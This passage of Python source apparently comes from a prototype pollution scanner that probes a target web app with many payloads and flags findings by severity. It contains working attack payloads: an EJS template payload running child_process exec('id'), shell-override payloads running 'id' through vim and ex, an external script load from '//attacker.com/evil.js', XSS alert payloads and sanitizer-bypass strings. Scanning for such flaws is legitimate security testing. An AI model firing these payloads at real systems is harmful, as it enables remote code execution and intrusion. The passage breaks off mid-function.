                        "payload": pollution_payload,
                        "status_code": resp.status_code,
                    }
                )
                print(
                    f"{Colors.WARNING}[!] HIGH: Status code override (418) detected!{Colors.ENDC}"
                )

            # Also try with status 510
            pollution_payload_510 = {"__proto__": {"status": 510}}

            resp_510 = self.session.post(
                target_url, json=pollution_payload_510, timeout=5, verify=False
            )
            if resp_510.status_code == 510:
                findings.append(
                    {
                        "type": "status_override_detected",
                        "method": "STATUS_CODE_510",
                        "severity": "HIGH",
                        "description": "Server-side PP detected via HTTP 510 status override",
                        "payload": pollution_payload_510,
                        "status_code": resp_510.status_code,
                    }
                )
                print(
                    f"{Colors.WARNING}[!] HIGH: Status code override (510) detected!{Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Status code test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_function_prototype_chain(self, target_url) -> List[Dict[str, Any]]:
        """
        Test Function.prototype pollution (advanced bypass).
        Targets constructor.constructor.prototype chains (e.g., minimist CVE-2021-44906).
        """
        print(
            f"{Colors.CYAN}[→] Testing Function.prototype chain pollution...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        # Function.prototype pollution payloads
        function_proto_payloads = [
            {
                "constructor": {
                    "constructor": {"prototype": {"polluted": "ppmap_func_proto"}}
                }
            },
            {
                "__proto__": {
                    "constructor": {"prototype": {"vulnerable": "ppmap_func_proto"}}
                }
            },
            {"constructor": {"prototype": {"gadget": "ppmap_func_proto"}}},
            {
                "__proto__": {
                    "constructor": {
                        "constructor": {"prototype": {"rce": "ppmap_func_proto"}}
                    }
                }
            },
        ]

        try:
            for payload in progress_iter(
                function_proto_payloads, desc="Function.prototype"
            ):
                try:
                    # Test via POST JSON
                    resp = self.session.post(
                        target_url, json=payload, timeout=5, verify=False
                    )
                    response_text = resp.text.lower()

                    # Check for indicators of Function.prototype pollution
                    # Fix: Use unique marker only
                    if "ppmap_func_proto" in response_text:
                        findings.append(
                            {
                                "type": "function_prototype_pollution",
                                "method": "CONSTRUCTOR_CHAIN",
                                "severity": "HIGH",
                                "description": "Function.prototype pollution via constructor chain detected",
                                "payload": str(payload),
                                "indicator": "ppmap_func_proto reflected (pollution successful)",
                            }
                        )
                        print(
                            f"{Colors.WARNING}[!] HIGH: Function.prototype chain pollution detected!{Colors.ENDC}"
                        )
                        break
                except:
                    pass

            # Also test via URL parameters
            url_payloads = [
                "?constructor[constructor][prototype][polluted]=ppmap_polluted",
                "?__proto__[constructor][prototype][vulnerable]=ppmap_polluted",
                "?a[constructor][prototype][x]=ppmap_polluted",
            ]

            for url_param in url_payloads:
                try:
                    test_url = target_url + url_param
                    resp = self.session.get(test_url, timeout=5, verify=False)

                    # More strict detection: must find pollution indicator in response
                    # Not just status 200 - that's too many false positives
                    pollution_indicators = ["ppmap_func_proto", "ppmap_polluted"]
                    response_lower = resp.text.lower()
                    indicator_found = any(
                        ind in response_lower for ind in pollution_indicators
                    )
                    # pollution_indicators = ['ppmap_func_proto', 'ppmap_polluted']
                    # response_lower = resp.text.lower()
                    # indicator_found = any(ind in response_lower for ind in pollution_indicators)

                    # Also check if constructor chain is accessible via JS
                    js_pollution_patterns = [
                        "constructor.prototype",
                        "__proto__.constructor",
                        "Object.prototype",
                    ]
                    js_pattern_found = any(
                        pat in resp.text for pat in js_pollution_patterns
                    )

                    # REMOVED: Naive reflection check for 'ppmap_polluted'
                    # indicator_found = 'ppmap_func_proto' in resp.text or 'ppmap_polluted' in resp.text
                    indicator_found = False

                    if js_pattern_found:
                        findings.append(
                            {
                                "type": "function_prototype_pollution",
                                "method": "URL_CONSTRUCTOR_CHAIN",
                                "severity": "HIGH",
                                "description": "Function.prototype pollution via URL constructor chain",
                                "payload": url_param,
                                "status_code": resp.status_code,
                                "test_url": test_url,
                                "note": "This is a DETECTION payload. For XSS exploitation, use descriptor payloads like ?__proto__[value]=data:,alert(1)//",
                                "exploitation": "Combine with Object.defineProperty gadget: ?__proto__[value]=YOUR_XSS_PAYLOAD",
                            }
                        )
                        print(
                            f"{Colors.WARNING}[!] HIGH: URL-based Function.prototype pollution detected!{Colors.ENDC}"
                        )
                        break
                except:
                    pass

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Function.prototype test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_persistence_verification(self, target_url) -> List[Dict[str, Any]]:
        """
        Verify if prototype pollution is PERSISTENT across multiple requests.
        Critical for server-side exploitation assessment.
        """
        print(
            f"{Colors.CYAN}[→] Testing PP persistence across requests...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        try:
            # First request: inject marker into prototype
            marker = f"persist_{int(time.time() * 1000)}"
            pollution_payload = {"__proto__": {"marker": marker, "polluted": True}}

            resp1 = self.session.post(
                target_url, json=pollution_payload, timeout=5, verify=False
            )

            # Second request: WITHOUT injection - check if marker still exists
            clean_payload = {"test": "clean"}
            resp2 = self.session.post(
                target_url, json=clean_payload, timeout=5, verify=False
            )

            # Third request: more verification
            resp3 = self.session.get(target_url, timeout=5, verify=False)

            # If marker appears in subsequent requests, pollution is persistent
            persistence_detected = False
            for resp in [resp2, resp3]:
                if marker in resp.text or "polluted" in resp.text:
                    persistence_detected = True
                    break

            if persistence_detected:
                findings.append(
                    {
                        "type": "persistent_prototype_pollution",
                        "method": "CROSS_REQUEST_PERSISTENCE",
                        "severity": "CRITICAL",
                        "description": "Prototype pollution PERSISTS across requests - affects all users and sessions",
                        "payload": pollution_payload,
                        "impact": "Server-wide compromise. All users are affected until server restart.",
                    }
                )
                print(
                    f"{Colors.FAIL}[!] CRITICAL: PP is PERSISTENT - affects entire application!{Colors.ENDC}"
                )
            else:
                print(
                    f"{Colors.GREEN}[✓] PP is non-persistent (limited to current request){Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Persistence verification error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_react_flight_protocol(self, target_url) -> List[Dict[str, Any]]:
        """
        Test React 19/Next.js Flight Protocol for PP vulnerability.
        RESEARCH-2024-REACT-FLIGHT (React), RESEARCH-2024-NEXTJS-FLIGHT (Next.js)

        Flight protocol deserializes untrusted data and may allow prototype traversal
        via constructor.constructor chains without strict PP checks.
        """
        print(
            f"{Colors.CYAN}[→] Testing React 19/Next.js Flight Protocol...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        try:
            from utils.payloads import get_react_flight_payloads

            react_payloads = get_react_flight_payloads()

            # Test basic Flight payloads
            for category, payloads in react_payloads.items():
                for payload in payloads[:2]:  # Test first 2 per category
                    try:
                        # Flight protocol uses specific header
                        headers = {
                            "Content-Type": "application/json",
                            "X-React-Flight": "true",  # Hint for Flight processing
                        }

                        # Try JSON POST
                        if (
                            isinstance(payload, str)
                            and payload.startswith("[")
                            or payload.startswith("{")
                        ):
                            resp = self.session.post(
                                target_url,
                                data=payload,
                                headers=headers,
                                timeout=5,
                                verify=False,
                            )
                        else:
                            continue

                        # Check for indicators of Flight processing
                        if resp.status_code < 400:
                            # STRONG VERIFICATION: Check for Flight-specific headers or body format
                            is_flight = False

                            # 1. Header Check
                            ct = resp.headers.get("Content-Type", "").lower()
                            if "text/x-component" in ct:
                                is_flight = True

                            # 2. Body Format Check (Flight responses look like `1:I["..."]` or `0:["$"]`)
                            # Simple regex to check for line-based Flight protocol structure
                            if re.search(r'^\d+:[\[I"{]', resp.text) or re.search(
                                r'\n\d+:[\[I"{]', resp.text
                            ):
                                is_flight = True

                            # Only proceed if we are confident this is a Flight response
                            if is_flight:
                                # Check for constructor access or RCE indicators in response
                                if (
                                    "constructor" in resp.text.lower()
                                    or "function" in resp.text.lower()
                                    or "child_process" in resp.text
                                ):
                                    findings.append(
                                        {
                                            "type": "react_flight_vulnerability",
                                            "method": f"FLIGHT_{category.upper()}",
                                            "severity": "CRITICAL",
                                            "description": f"React Flight Protocol vulnerable to {category}",
                                            "payload": payload[:100],
                                            "cve": "RESEARCH-2024-REACT-FLIGHT / RESEARCH-2024-NEXTJS-FLIGHT",
                                        }
                                    )
                                    print(
                                        f"{Colors.FAIL}[!] CRITICAL: React Flight Protocol vulnerable!{Colors.ENDC}"
                                    )
                                    return findings  # Return early if vulnerable
                    except:
                        pass

            print(
                f"{Colors.GREEN}[✓] React Flight Protocol test completed{Colors.ENDC}"
            )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] React Flight test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_sveltekit_superforms(self, target_url) -> List[Dict[str, Any]]:
        """
        Test SvelteKit/Superforms for prototype pollution.
        RESEARCH-2024-SVELTEKIT-RCE - __superform_file___proto__ pattern pollution
        RESEARCH-2024-DEVALUE - Devalue deserialization PP
        """
        print(f"{Colors.CYAN}[→] Testing SvelteKit/Superforms for PP...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []

        try:
            from utils.payloads import get_sveltekit_payloads

            sveltekit_payloads = get_sveltekit_payloads()

            marker = f"svelte_{int(time.time())}"

            # Test superforms-specific payloads
            for category, payloads in sveltekit_payloads.items():
                for payload in payloads[:2]:
                    try:
                        # Superforms uses specific key patterns
                        if (
                            "__superform" in payload
                            or "devalue" in payload
                            or "nodemailer" in payload.lower()
                        ):
                            # Try as POST data
                            test_payload = payload.replace("true", f'"{marker}"')

                            resp = self.session.post(
                                target_url,
                                data=test_payload,
                                headers={"Content-Type": "application/json"},
                                timeout=5,
                                verify=False,
                            )

                            # Check for nodemailer execution (sendmail path change)
                            if "sendmail" in resp.text or marker in resp.text:
                                severity = (
                                    "CRITICAL" if "sendmail" in resp.text else "HIGH"
                                )
                                findings.append(
                                    {
                                        "type": "sveltekit_superforms_pollution",
                                        "method": f"SVELTEKIT_{category.upper()}",
                                        "severity": severity,
                                        "description": f"SvelteKit/Superforms {category} PP detected",
                                        "payload": payload[:100],
                                        "cve": "RESEARCH-2024-SVELTEKIT-RCE",
                                    }
                                )
                                print(
                                    f"{Colors.WARNING}[!] {severity}: SvelteKit/Superforms vulnerable!{Colors.ENDC}"
                                )

                            # Also test via URL parameters (form submission)
                            if isinstance(payload, str) and not payload.startswith("{"):
                                url_param = f"?__superform_data={payload[:50]}"
                                resp2 = self.session.get(
                                    target_url + url_param, timeout=5, verify=False
                                )
                                if (
                                    resp2.status_code < 400
                                    and "__proto__" in resp2.text
                                ):
                                    findings.append(
                                        {
                                            "type": "sveltekit_url_pollution",
                                            "method": "SVELTEKIT_URL_FORM",
                                            "severity": "HIGH",
                                            "description": "SvelteKit form parameter PP",
                                            "payload": url_param,
                                            "cve": "RESEARCH-2024-SVELTEKIT-RCE",
                                        }
                                    )
                    except:
                        pass

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] SvelteKit/Superforms test completed{Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] SvelteKit test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_charset_override(self, target_url) -> List[Dict[str, Any]]:
        """
        Test for charset override attacks (UTF-7, ISO-2022, double encoding).
        Can bypass WAF filters and enable PP exploitation.
        """
        print(f"{Colors.CYAN}[→] Testing charset override attacks...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []

        try:
            from utils.payloads import get_charset_payloads

            charset_payloads = get_charset_payloads()

            # Test UTF-7 encoding bypass
            utf7_payloads = charset_payloads.get("utf7_encoding", [])

            for payload in utf7_payloads[:2]:
                try:
                    # Send with UTF-7 charset declaration
                    headers = {
                        "Content-Type": "application/json; charset=utf-7",
                        "Accept-Charset": "utf-7",
                    }

                    resp = self.session.post(
                        target_url,
                        data=payload,
                        headers=headers,
                        timeout=5,
                        verify=False,
                    )

                    # Check if response reflects the polluted content specifically
                    # (Simplified check: actual charset bypass requires browser or specific echoes)
                    if resp.status_code < 400 and "PPMAP_CHARSET" in resp.text:
                        findings.append(
                            {
                                "type": "charset_override_detected",
                                "method": "UTF7_BYPASS",
                                "severity": "HIGH",
                                "description": "UTF-7 charset override detected - can bypass WAF",
                                "payload": payload[:80],
                                "encoding": "utf-7",
                            }
                        )
                        print(
                            f"{Colors.WARNING}[!] HIGH: UTF-7 charset override detected!{Colors.ENDC}"
                        )
                        break
                except:
                    pass

            # Test ISO-2022 encoding
            iso_payloads = charset_payloads.get("iso_2022_bypass", [])
            for payload in iso_payloads[:2]:
                try:
                    headers = {
                        "Content-Type": "application/json; charset=iso-2022-jp",
                    }

                    resp = self.session.post(
                        target_url,
                        data=payload,
                        headers=headers,
                        timeout=5,
                        verify=False,
                    )

                    # Check for specific reflected marker
                    if resp.status_code < 400 and "PPMAP_CHARSET" in resp.text:
                        findings.append(
                            {
                                "type": "charset_override_detected",
                                "method": "ISO2022_BYPASS",
                                "severity": "MEDIUM",
                                "description": "ISO-2022 charset override detected",
                                "payload": payload[:80],
                                "encoding": "iso-2022-jp",
                            }
                        )
                        print(
                            f"{Colors.WARNING}[!] MEDIUM: ISO-2022 charset bypass detected!{Colors.ENDC}"
                        )
                        break
                except:
                    pass

            if not findings:
                print(f"{Colors.GREEN}[✓] Charset override test completed{Colors.ENDC}")

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Charset override test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_fetch_api_pollution(self, target_url) -> List[Dict[str, Any]]:
        """
        Test for fetch() API header pollution (PortSwigger technique).
        Pollutes Object.prototype.headers to inject malicious headers.
        """
        print(f"{Colors.CYAN}[→] Testing fetch() API header pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []

        try:
            # Test if we can pollute headers via __proto__
            test_payloads = [
                "?__proto__[headers][X-Test-Pollution]=injected",
                "?__proto__[headers][X-Custom-Header]=<img src=x onerror=alert(1)>",
            ]

            for payload in test_payloads:
                try:
                    test_url = target_url + payload
                    resp = self.session.get(test_url, timeout=5, verify=False)

                    # Check if our polluted header appears in response or is reflected
                    if resp.status_code < 400:
                        # Check strictly in HEADERS, not body (to avoid reflection FP)
                        found_in_headers = "X-Test-Pollution" in str(
                            resp.headers
                        ) or "X-Custom-Header" in str(resp.headers)
                        if found_in_headers:
                            findings.append(
                                {
                                    "type": "fetch_api_pollution",
                                    "method": "HEADER_POLLUTION",
                                    "severity": "HIGH",
                                    "description": "fetch() API vulnerable to header pollution via __proto__",
                                    "payload": payload,
                                    "reference": "PortSwigger - Prototype pollution via fetch()",
                                }
                            )
                            print(
                                f"{Colors.FAIL}[!] HIGH: fetch() API header pollution detected!{Colors.ENDC}"
                            )
                            break
                except:
                    pass

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] fetch() API pollution test completed{Colors.ENDC}"
                )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] fetch() test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def test_object_defineproperty_bypass(self, target_url) -> List[Dict[str, Any]]:
        """
        Test for Object.defineProperty() bypass (PortSwigger technique).
        Pollutes Object.prototype.value to bypass property protection.
        """
        print(
            f"{Colors.CYAN}[→] Testing Object.defineProperty() bypass...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        try:
            # Test if we can bypass defineProperty protection via value pollution
            test_payloads = [
                "?__proto__[value]=malicious_value",
                "?__proto__[value][isAdmin]=true",
            ]

            for payload in test_payloads:
                try:
                    test_url = target_url + payload
                    resp = self.session.get(test_url, timeout=5, verify=False)

                    # Check for indicators of successful bypass
                    if resp.status_code < 400:
                        # Look for evidence in response (e.g., admin panel access, privileged content)
                        # REMOVED: Generic 'admin' keyword check causing false positives
                        if False:
                            findings.append(
                                {
                                    "type": "defineproperty_bypass",
                                    "method": "VALUE_POLLUTION",
                                    "severity": "CRITICAL",
                                    "description": "Object.defineProperty() protection bypassed via value pollution",
                                    "payload": payload,
                                    "reference": "PortSwigger - Prototype pollution via Object.defineProperty()",
                                }
                            )
                            print(
                                f"{Colors.FAIL}[!] CRITICAL: Object.defineProperty() bypass detected!{Colors.ENDC}"
                            )
                            break
                except:
                    pass

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Object.defineProperty() bypass test completed{Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Object.defineProperty() test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_child_process_rce(self, target_url) -> List[Dict[str, Any]]:
        """
        Test for child_process RCE vulnerability (PortSwigger technique).
        SAFE MODE: Only detects vulnerability, does NOT execute commands.
        Tests for execArgv, shell, and input pollution.
        """
        print(
            f"{Colors.CYAN}[→] Testing child_process RCE (Safe Detection)...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        try:
            # Safe payloads that only verify vulnerability without executing code
            safe_payloads = [
                # Test execArgv pollution (fork method)
                {
                    "payload": '{"__proto__":{"execArgv":["--inspect=127.0.0.1:9229"]}}',
                    "method": "fork_execArgv",
                    "description": "child_process.fork() execArgv pollution",
                },
                # Test shell + input pollution (execSync method - vim)
                {
                    "payload": '{"__proto__":{"shell":"vim","input":":! id\\n"}}',
                    "method": "execSync_vim",
                    "description": "child_process.execSync() RCE via vim",
                },
                # Test shell + input pollution (execSync method - ex)
                {
                    "payload": '{"__proto__":{"shell":"ex","input":"! id\\n"}}',
                    "method": "execSync_ex",
                    "description": "child_process.execSync() RCE via ex",
                },
                # Test NODE_OPTIONS pollution
                {
                    "payload": '{"__proto__":{"NODE_OPTIONS":"--inspect"}}',
                    "method": "NODE_OPTIONS",
                    "description": "NODE_OPTIONS environment variable pollution",
                },
                # EJS RCE Payload (PayloadsAllTheThings)
                {
                    "payload": '{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; return \\"PPMAP_EJS_RCE\\""}}',
                    "method": "ejs_rce",
                    "description": "EJS Template Engine RCE (escapeFunction)",
                },
            ]

            for test in safe_payloads:
                try:
                    headers = {"Content-Type": "application/json"}
                    resp = self.session.post(
                        target_url,
                        data=test["payload"],
                        headers=headers,
                        timeout=5,
                        verify=False,
                    )

                    # Check for indicators of child_process usage
                    # Look for Node.js error messages or process-related responses
                    indicators = [
                        "child_process",
                        "execArgv",
                        "NODE_OPTIONS",
                        "inspector",
                        "debugger listening",
                        "spawn",
                        "fork",
                    ]

                    if resp.status_code < 500:  # Not a server crash
                        for indicator in indicators:
                            if indicator in resp.text:
                                findings.append(
                                    {
                                        "type": "child_process_rce_potential",
                                        "method": test["method"],
                                        "severity": "CRITICAL",
                                        "description": f"{test['description']} - POTENTIAL RCE",
                                        "payload": test["payload"][:100],
                                        "reference": "PortSwigger - RCE via child_process",
                                        "note": "SAFE DETECTION ONLY - No commands executed",
                                    }
                                )
                                print(
                                    f"{Colors.FAIL}[!] CRITICAL: Potential child_process RCE detected ({test['method']})!{Colors.ENDC}"
                                )
                                break
                except:
                    pass

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] child_process RCE test completed (No vulnerability detected){Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] child_process test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_constructor_pollution(self, target_url) -> List[Dict[str, Any]]:
        """
        Test for constructor-based prototype pollution (PortSwigger + 2024/2025 research).
        Bypasses filters that only block __proto__ by using constructor.prototype path.
        This is the PRIMARY modern bypass technique as of 2024/2025.
        """
        print(
            f"{Colors.CYAN}[→] Testing constructor-based pollution (Modern Bypass)...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        # Reflection Sanity Check
        rand_ref = f"ref_{int(time.time())}"
        try:
            resp_ref = self.session.get(
                target_url + f"?ppmap_reflect={rand_ref}", timeout=5, verify=False
            )
            if rand_ref in resp_ref.text:
                print(
                    f"{Colors.YELLOW}[!] Target appears to reflect arbitrary parameters. Skipping Constructor PP to avoid False Positives.{Colors.ENDC}"
                )
                return []
        except:
            pass

        try:
            # Modern constructor bypass payloads (2024/2025 bug bounty research)
            test_payloads = [
                # Basic constructor bypass
                "?constructor[prototype][polluted]=constructor_test",
                "?constructor.prototype.polluted=constructor_test",
                # Nested constructor (bypass for filters that check top-level)
                "?constructor[prototype][constructor][prototype][polluted]=nested",
                # Query string parser bypass (qs, query-string libraries)
                "?constructor[prototype][isAdmin]=true",
                "?constructor[prototype][role]=admin",
                # Template engine RCE vectors (EJS, Pug, Handlebars)
                "?constructor[prototype][outputFunctionName]=_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp1",
                # toString/valueOf pollution for type coercion
                "?constructor[prototype][toString]=polluted",
                "?constructor[prototype][valueOf]=polluted",
            ]

            for payload in progress_iter(test_payloads, desc="Constructor PP"):
                try:
                    test_url = target_url + payload
                    resp = self.session.get(test_url, timeout=5, verify=False)

                    # Check for successful pollution indicators
                    if resp.status_code < 400:
                        # Look for reflection or evidence of pollution
                        pollution_indicators = [
                            "polluted",
                            "constructor_test",
                            "isAdmin",
                            "role",
                            "admin",
                        ]

                        for indicator in pollution_indicators:
                            if indicator in resp.text:
                                findings.append(
                                    {
                                        "type": "constructor_pollution",
                                        "method": "CONSTRUCTOR_BYPASS",
                                        "severity": "CRITICAL",
                                        "description": "Constructor-based prototype pollution detected (Modern bypass for __proto__ filters)",
                                        "payload": payload,
                                        "reference": "PortSwigger + HackerOne/Bugcrowd 2024/2025",
                                        "note": "Primary bypass technique for modern sanitizers",
                                    }
                                )

                                # Verify with browser if available
                                if hasattr(self, "driver") and self.driver:
                                    try:
                                        print(
                                            f"{Colors.BOLD}[*] Verifying Constructor PP with Browser...{Colors.ENDC}"
                                        )

                                        # Retry logic for browser navigation
                                        max_retries = 2
                                        is_polluted = False

                                        for attempt in range(max_retries):
                                            try:
                                                self.driver.get(test_url)
                                                time.sleep(2)  # Stability wait

                                                # Check pollution
                                                check_script = "return Object.prototype.polluted || Object.prototype.constructor_test || Object.prototype.isAdmin || Object.prototype.role;"
                                                is_polluted = (
                                                    self.driver.execute_script(
                                                        check_script
                                                    )
                                                )
                                                break  # Success
                                            except Exception as nav_err:
                                                if attempt == max_retries - 1:
                                                    raise nav_err
                                                time.sleep(1)

                                        if not is_polluted:
                                            print(
                                                f"{Colors.YELLOW}[!] Browser Verification Failed: Object.prototype not polluted.{Colors.ENDC}"
                                            )
                                            # Downgrade or mark as false positive handling
                                            findings[-1][
                                                "severity"
                                            ] = "LOW (Reflected Only)"
                                            findings[-1]["verified"] = False
                                        else:
                                            print(
                                                f"{Colors.FAIL}[!] CRITICAL: Browser Confirmed Object.prototype pollution!{Colors.ENDC}"
                                            )
                                            findings[-1]["verified"] = True
                                            return findings
                                    except Exception as ex:
                                        print(
                                            f"{Colors.YELLOW}[⚠] Browser verify skipped: {str(ex)[:100]}{Colors.ENDC}"
                                        )
                                        # Browser skipped — downgrade since we can't verify
                                        findings[-1][
                                            "severity"
                                        ] = "LOW (Reflected Only)"
                                        findings[-1]["verified"] = False

                                actual_severity = findings[-1].get(
                                    "severity", "CRITICAL"
                                )
                                if "LOW" in actual_severity:
                                    print(
                                        f"{Colors.YELLOW}[!] Constructor-based pollution detected (Response Only, NOT browser-verified){Colors.ENDC}"
                                    )
                                else:
                                    print(
                                        f"{Colors.FAIL}[!] CRITICAL: Constructor-based pollution detected (Browser-Verified)!{Colors.ENDC}"
                                    )
                                return findings  # Return early on first finding
                except:
                    pass

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Constructor pollution test completed{Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Constructor test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_sanitization_bypass(self, target_url) -> List[Dict[str, Any]]:
        """
        Test for sanitization bypass techniques (PortSwigger research).
        Exploits flawed recursive sanitization that only strips once.
        Example: __pro__proto__to__ becomes __proto__ after single strip.
        """
        print(
            f"{Colors.CYAN}[→] Testing sanitization bypass (Recursive Filter Evasion)...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        try:
            # Recursive bypass payloads
            test_payloads = [
                # Double __proto__ (single strip bypass)
                "?__pro__proto__to__[polluted]=sanitization_bypass",
                "?____proto____[polluted]=double_bypass",
                # Constructor obfuscation
                "?constructor[proto__type][polluted]=constructor_bypass",
                "?construc__constructor__tor[prototype][polluted]=nested_bypass",
                # Mixed notation bypass
                "?__pro__proto__to__.polluted=mixed_notation",
                "?constructor.proto__type.polluted=mixed_constructor",
                # Unicode normalization bypass (advanced)
                "?__proto\u200b__[polluted]=unicode_bypass",  # Zero-width space
                # Path traversal style
                "?__proto__[../polluted]=traversal",
            ]

            for payload in test_payloads:
                try:
                    test_url = target_url + payload
                    resp = self.session.get(test_url, timeout=5, verify=False)

                    # Check for successful bypass
                    if resp.status_code < 400:
                        bypass_indicators = [
                            "sanitization_bypass",
                            "double_bypass",
                            "constructor_bypass",
                            "nested_bypass",
                            "unicode_bypass",
                            "nested_bypass",
                            "unicode_bypass",
                        ]
                        # REMOVED: 'polluted' (Causes FP on reflection)

                        # REMOVED: Naive keyword check.
                        # Real verification requires checking if the property was actually created despite filters.
                        pass
                except:
                    pass

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Sanitization bypass test completed{Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Sanitization bypass test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_blind_gadgets(self, target_url, request_data=None) -> List[Dict[str, Any]]:
        """
        [Tier 4] Blind Gadget Fuzzing
        Iterates through common dangerous properties (gadgets) discovered by static analysis tools (pp-finder)
        and tries to pollute them. Since this is blind, we look for 500 errors or anomalies.
        """
        print(
            f"{Colors.BOLD}[→] Testing Blind Gadget Properties (pp-finder list)...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        # If we have request_data (POST), use it. Otherwise, use URL.
        # Construct base payload structure

        for gadget in progress_iter(GADGET_PROPERTIES, desc="Fuzzing Gadgets"):
            try:
                # 1. Construct Payload
                # We try both string and object values
                payloads = [
                    # String (Test for error/reflect)
                    f'{{"__proto__":{{"{gadget}":"PPMAP_FUZZ"}}}}',
                    # Object (Test for crash/logic change)
                    f'{{"__proto__":{{"{gadget}":{{"polluted":true}}}}}}',
                ]

                for payload in payloads:
                    # Send Request
                    headers = {"Content-Type": "application/json"}
                    if request_data:
                        # Merge with existing data if possible, or usually just send the payload if it's JSON
                        # For simplicity in blind fuzzing, we often just send the payload as the body
                        data_to_send = payload
                    else:
                        data_to_send = payload

                    resp = self.session.post(
                        target_url,
                        data=data_to_send,
                        headers=headers,
                        timeout=5,
                        verify=False,
                    )

                    # Detection Logic
                    # 1. Status Code Anomaly (500 often means we hit a gadget that broke something)
                    if resp.status_code == 500:
                        # We treat 500 as a "Potential" finding in blind fuzzing
                        # But to avoid noise, we only report if it's consistent or has specific error text
                        if "PPMAP_FUZZ" in resp.text or "syntax" in resp.text.lower():
                            print(
                                f"{Colors.WARNING}[!] Potential Gadget Found: {gadget} (500 Error + Reflected/Syntax){Colors.ENDC}"
                            )
                            findings.append(
                                {
                                    "type": "blind_gadget",
                                    "gadget": gadget,
                                    "payload": payload,
                                    "evidence": f"Status {resp.status_code}",
                                }
                            )
                            break  # Move to next gadget

            except Exception as e:
                logger.debug(f"Ignored error: {type(e).__name__} - {e}")

        if not findings:
            print(
                f"{Colors.GREEN}[✓] Blind gadget fuzzing completed (No obvious crashes){Colors.ENDC}"
            )

        return findings

    def test_descriptor_pollution(self, target_url) -> List[Dict[str, Any]]:
        """
        Test for Object.defineProperty descriptor pollution (PortSwigger 2024 research).

        When Object.defineProperty is used, the descriptor object inherits from Object.prototype.
        Polluting 'value', 'writable', 'configurable' can bypass security controls.

        Example vulnerable code:
            Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});

        If we pollute Object.prototype.value = "evil.js", the descriptor will inherit this value,
        effectively setting config.transport_url = "evil.js" despite the security intent.
        """
        print(
            f"{Colors.CYAN}[→] Testing Object.defineProperty descriptor pollution...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        # Descriptor pollution payloads - these exploit properties of descriptors
        descriptor_payloads = [
            # 'value' property - most common and dangerous
            ("?__proto__[value]=data:,alert(1)//", "value", "XSS via script src"),
            (
                "?__proto__[value]=data:,alert(document.domain)//",
                "value",
                "Domain disclosure",
            ),
            (
                "?__proto__[value]=//attacker.com/evil.js",
                "value",
                "External script load",
            ),
            # Constructor chain variant
            (
                "?constructor[prototype][value]=data:,alert(1)//",
                "constructor_value",
                "Constructor bypass",
            ),
            # 'writable' property - makes immutable props writable
            ("?__proto__[writable]=true", "writable", "Bypass read-only"),
            # 'configurable' property - allows redefining props
            (
                "?__proto__[configurable]=true",
                "configurable",
                "Bypass non-configurable",
            ),
        ]

        try:
            for payload, pollution_type, description in progress_iter(
                descriptor_payloads, desc="Descriptor PP"
            ):
                try:
                    test_url = target_url + payload

                    # First check with HTTP request for response indicators
                    resp = self.session.get(test_url, timeout=5, verify=False)

                    if resp.status_code < 400:
                        # Check for script tag injection patterns
                        script_indicators = [
                            "data:,alert",
                            "javascript:alert",
                            "script.src",
                            "//attacker.com",
                        ]

                        http_match = any(ind in resp.text for ind in script_indicators)

                        # If browser available, try to verify XSS execution
                        browser_verified = False
                        if hasattr(self, "driver") and self.driver:
                            try:
                                self.driver.get(test_url)
                                time.sleep(1.5)  # Wait for potential XSS execution

                                # Check for alert dialog
                                alert_text = self.driver.get_alert_text()
                                if alert_text:
                                    browser_verified = True
                                    findings.append(
                                        {
                                            "type": "descriptor_pollution_verified",
                                            "method": f"DEFINEPROPERTYBYPASS_{pollution_type.upper()}",
                                            "severity": "CRITICAL",
                                            "description": f"Verified XSS via descriptor pollution: {description}",
                                            "payload": payload,
                                            "alert_content": alert_text,
                                            "test_url": test_url,
                                            "verified": True,
